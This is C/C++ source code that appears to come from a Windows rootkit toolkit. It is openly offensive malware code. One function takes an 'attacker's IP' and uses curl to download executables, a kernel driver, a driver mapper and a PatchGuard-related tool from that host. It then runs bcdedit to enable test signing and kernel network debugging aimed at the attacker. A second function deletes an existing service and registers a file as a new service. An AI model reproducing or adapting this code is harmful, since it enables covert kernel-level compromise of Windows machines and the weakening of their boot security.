#include "configurations.h"


BOOL FilesAndDebugging(const char* AttackerIp, const char* DebugPort, const char* DebugKey) {
	if (AttackerIp == NULL) {
		printf("[-] Cannot get needed files on target machine - attacker's IP address is not specified!\n");
		return FALSE;
	}

	if (system("if exist C:\\nosusfolder rmdir /s /q C:\\nosusfolder") == -1) {
		printf("[-] Failed execution of initial deleting command of nosusfolder 1 - %d\n", GetLastError());
		return FALSE;
	}
	if (system("if exist C:\\nosusfolder rmdir /s /q C:\\nosusfolder") == -1) {
		printf("[-] Failed execution of initial deleting command of nosusfolder 2 - %d\n", GetLastError());
		return FALSE;
	}

	const char* ReplaceArr[3] = { AttackerIp, DebugPort, DebugKey };
	const char* SymbolsArr = "~`\'";
	const int TotalCommands = 43;
	const char* FileCommands[TotalCommands] = {
		"cd C:\\ && ",
		"mkdir nosusfolder && ",
		"cd nosusfolder && ",
		"mkdir verysus && ",
		"cd verysus && ",
		"mkdir MainMedium && ",
		"cd MainMedium && ",
		"curl http://~:8080/MainMedium/MainMedium.sln --output MainMedium.sln && ",
		"curl http://~:8080/MainMedium/medium.cpp --output medium.cpp && ",
		"curl http://~:8080/MainMedium/medium.h --output medium.h && ",
		"curl http://~:8080/MainMedium/rootreqs.cpp --output rootreqs.cpp && ",
		"curl http://~:8080/MainMedium/rootreqs.h --output rootreqs.h && ",
		"curl http://~:8080/MainMedium/internet.cpp --output internet.cpp && ",
		"curl http://~:8080/MainMedium/internet.h --output internet.h && ",
		"curl http://~:8080/MainMedium/helpers.cpp --output helpers.cpp && ",
		"curl http://~:8080/MainMedium/helpers.h --output helpers.h && "
		"curl http://~:8080/MainMedium/MainMedium.vcxproj --output MainMedium.vcxproj && ",
		"curl http://~:8080/MainMedium/MainMedium.vcxproj.filters --output MainMedium.vcxproj.filters && ",
		"curl http://~:8080/MainMedium/MainMedium.vcxproj.user --output MainMedium.vcxproj.user && ",
		"mkdir x64\\Release && ",
		"cd x64\\Release && ",
		"curl http://~:8080/MainMedium/x64/Release/MainMedium.exe --output MainMedium.exe && ",
		"cd .. && ",
		"cd .. && ",
		"cd .. && ",
		"mkdir AutoService && ",
		"cd AutoService && ",
		"curl http://~:8080/trypack/AutoStart/x64/Release/AutoStart.exe --output AutoStart.exe && ",
		"cd .. && ",
		"mkdir KMDFdriver && ",
		"cd KMDFdriver && ",
		"mkdir Release && ",
		"cd Release && ",
		"curl http://~:8080/KMDFdriver/x64/Release/KMDFdriver/KMDFdriver.sys --output KMDFdriver.sys && ",
		"curl http://~:8080/KMDFdriver/x64/Release/KMDFdriver/KMDFdriver.inf --output KMDFdriver.inf && ",
		"curl http://~:8080/KMDFdriver/x64/Release/KMDFdriver.pdb --output KMDFdriver.pdb && ",
		"cd .. && ",
		"cd .. && ",
		"curl http://~:8080/drvmap-master/x64/Release/drvmap.exe --output drvmap.exe && ",
		"curl http://~:8080/KPP/GuardMon/x64/Release/GuardMon.sys --output GuardMon.sys && ",
		"curl http://~:8080/DrvLoader/DrvLoader/x64/Release/DrvLoader.exe --output DrvLoader.exe && ",
		"bcdedit /set TESTSIGNING ON && ",
		"bcdedit /set DEBUG ON && ",
		"bcdedit /dbgsettings NET HOSTIP:~ PORT:` KEY:\'" };
	    /*
		"curl http://~:8080/devcon.exe --output devcon.exe && ",
		"copy /Y devcon.exe KMDFdriver\\devcon.exe && ",
		"cd KMDFdriver && ",
		"devcon.exe install kmdfdriver.inf root\\kmdfdriver" };
		*/

	return PerformCommand(FileCommands, ReplaceArr, SymbolsArr, TotalCommands, 3);
}


BOOL SignAsService(char* ServicePath, RootService* ServiceObject, const char* ServiceName, DWORD ServiceType, DWORD ServiceStart, DWORD ErrorControl, const char* ServiceExt) {
	HANDLE ServiceHandle = INVALID_HANDLE_VALUE;
	DWORD ServiceSize = 0;
	PVOID ServiceBuffer = NULL;
	DWORD ServiceRead = 0;
	const char* RemoveExBase = "sc stop ~ && sc delete ~";
	char RemoveExisting[MAX_PATH] = { 0 };
	int ri = 0;


	// Delete existing service (if exists) -
	for (int i = 0; i <= strlen(RemoveExBase); i++) {
		if (RemoveExBase[i] == '~') {
			for (int ii = 0; ii < strlen(ServiceName); ii++) {
				RemoveExisting[ri] = ServiceName[ii];
				ri++;
			}
		}
		else {
			RemoveExisting[ri] = RemoveExBase[i];
			ri++;
		}
	}

	if (system(RemoveExisting) == -1) {
		return FALSE;
	}


	// Open handle and get size -
	ServiceHandle = CreateFileA(ServicePath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (ServiceHandle == INVALID_HANDLE_VALUE) {
		printf("Create reading file to create service (path = %s) - %d\n", ServicePath, GetLastError());
		return FALSE;
	}
	printf("LOG Created reading file to create service\n");

	ServiceSize = GetFileSize(ServiceHandle, NULL);
	if (ServiceSize == 0) {
		CloseHandle(ServiceHandle);
		printf("ServiceSize = 0\n");
		return FALSE;
	}
	printf("LOG Got file size of reading file to create service\n");


	// Initiate service -
	if (!ServiceObject->InitiateService(ServicePath, ServiceType, ErrorControl, ServiceStart, ServiceName, ServiceSize, ServiceExt)) {
		ServiceObject->FreeServiceBuffer();
		CloseHandle(ServiceHandle);
		printf("Initiating service object\n");
		return FALSE;
	}
	printf("LOG Initiated service object\n");


	// Read file content into buffer -
	ServiceBuffer = malloc(ServiceSize);
	if (ServiceBuffer == NULL) {
		ServiceObject->FreeServiceBuffer();
		CloseHandle(ServiceHandle);
		printf("Allocating service buffer\n");
		return FALSE;
	}
	printf("LOG Allocated service buffer\n");

	if (!ReadFile(ServiceHandle, ServiceBuffer, ServiceSize, &ServiceRead, NULL) || ServiceRead != ServiceSize) {
		ServiceObject->FreeServiceBuffer();
		free(ServiceBuffer);
		CloseHandle(ServiceHandle);
		printf("Reading service data - %d\n", GetLastError());
		return FALSE;
	}
	printf("LOG Read service data\n");
	CloseHandle(ServiceHandle);


	// Copy buffer in the service file buffer -
	ServiceObject->BufferOperation(ServiceBuffer, ServiceSize, FALSE);
	free(ServiceBuffer);


	// Load (create service entry on temp file copy and start service ONLY if demand_start is on) service -
	if (!ServiceObject->LoadService()) {
		ServiceObject->FreeServiceBuffer();
		printf("Loading service\n");
		return FALSE;
	}
	printf("LOG Loaded service\n");
	return TRUE;
}